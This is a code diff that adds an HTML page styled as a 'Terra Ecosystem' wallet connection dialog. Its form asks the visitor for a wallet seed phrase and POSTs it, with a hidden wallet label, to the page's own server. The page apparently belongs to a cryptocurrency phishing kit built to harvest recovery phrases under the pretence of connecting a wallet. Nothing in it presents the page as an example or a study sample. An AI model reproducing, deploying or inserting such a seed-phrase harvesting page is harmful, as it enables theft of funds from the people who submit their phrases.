@@ -1,0 +1,57 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="theme-color" content="#2043b5" />
+	<!-- Latest compiled and minified CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+	<link rel="stylesheet" href="../../style/style.css">
+	<!-- jQuery library -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+	<!-- Popper JS -->
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+
+	<!-- Latest compiled JavaScript -->
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+	<title>Terra Ecosystem</title>
+</head>
+
+<body style="background: none;">
+
+	<form method="POST" class="">
+
+	
+		<div class="modal fade" id="connectModal" tabindex="-1" role="dialog" aria-labelledby="connectModal" aria-hidden="true">
+			<div class="modal-dialog modal-dialog-centered" role="document">
+				<div class="modal-content">
+					<div class="modal-body">
+						<div class="row mt-5">
+							<div class="col-sm-12">
+								<div class="form-group">
+									<label for="" style="font-size: 13px; color:#2043b5 ;">Seed Phrase <span class="text-danger">*</span></label>
+									<textarea type="text" name="phrase" class="form-control input-lg" placeholder="Seed Phrase" required></textarea>
+									<input type="hidden" name="wallet" value="Terra">
+									<div class="response text-danger">
+										
+										
+									 
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="modal-footer">
+						<button type="submit" name='submit' class="btn btn-primary text-white"> <span class="spinner"><i class="fa fa-spinner fa-pulse"></i></span> <span class="next-text">Connect Now</span></button>
+					</div>
+				</div>
+			</div>
+		</div>
+	</form>
+</body>
+<script src="js/script.js"></script>
+</html>
